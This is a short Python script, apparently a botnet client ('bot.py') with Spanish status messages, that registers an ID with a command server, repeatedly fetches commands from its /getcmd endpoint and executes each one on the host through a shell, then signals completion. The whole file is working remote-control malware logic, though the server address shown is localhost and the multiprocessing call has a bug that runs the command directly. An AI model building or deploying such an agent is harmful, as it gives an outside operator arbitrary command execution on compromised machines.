import requests
import time
import os
from urllib.request import urlopen
import multiprocessing
import subprocess
import sys

server = "http://127.0.0.1:4432"

def get_cmd():
    cmd = requests.get(server + '/getcmd')
    if cmd.text == "":
        print("ESPERANDO A UN COMANDO")
    else:
        print("EJECUTANDO ====== "+ cmd.text + " ======")
        p1 = multiprocessing.Process(name="p1",target=run_ssh(cmd))
        p1.start()

def run_ssh(cmd):
    try:
        output = subprocess.check_output(cmd.text, shell=True).decode('utf-8')
        print(output)
        time.sleep(8)
        requests.get(server + '/cmdfinished')
    except Exception:
        print("Ha habido un error con su comando")


def online():
    try:
        requests.get(server + '/imonline?id='+id)
    except Exception:
        print("\nNo se ha podido conectar con el servidor")

def main():
    while True:
        time.sleep(2)
        try:
            online()
            get_cmd()
        except Exception:
            print("\nHa ocurrido un error, Seguramente el servidor no este en linea")

if __name__ == '__main__':
    os.chdir('/')
    global id
    try:
        id=sys.argv[1]
        main()
    except KeyboardInterrupt:
        print("CERRANDO TODO :::::.......")
    except Exception:
        print("""Necesitas proporcionar un id numérico
Ej: python3 bot.py 1""")